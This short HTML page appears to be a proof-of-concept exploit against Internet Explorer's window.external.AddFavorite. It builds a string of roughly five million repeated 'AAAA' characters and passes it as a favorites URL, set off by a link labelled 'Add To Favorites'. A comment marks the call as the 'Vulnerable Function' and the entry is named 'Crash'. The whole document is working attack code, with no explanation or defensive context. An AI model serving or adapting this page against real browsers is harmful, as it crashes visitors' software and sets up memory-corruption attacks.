&lt;html&gt;
&lt;head&gt;
&lt;script language=&quot;JavaScript&quot; type=&quot;Text/Javascript&quot;&gt;
function go()
{
	var str =unescape(&#039;%u4141&#039;);
	var finalstr = createInlineBuffer(str, 5150000);
	var len = finalstr.length;
	document.write(len);
	addfav(finalstr);
}
			   
/* Effient in-line creation */
function createInlineBuffer (str, num) {
	var	i = Math.ceil(Math.log(num) / Math.LN2),
		res = str;
	do {
		res += res;
	} while (0 &lt; --i);
	return res.slice(0, str.length * num);
}

/* Vulnerable Function */
function addfav(str)
   {
   if (document.all)
      {
      window.external.AddFavorite
      (&#039;http://&#039;+str,&#039;Crash&#039;)
      }
   }
&lt;/script&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;a href=&quot;javascript:go()&quot;&gt;Add To Favorites&lt;/a&gt;
&lt;/body&gt;
&lt;/html&gt;


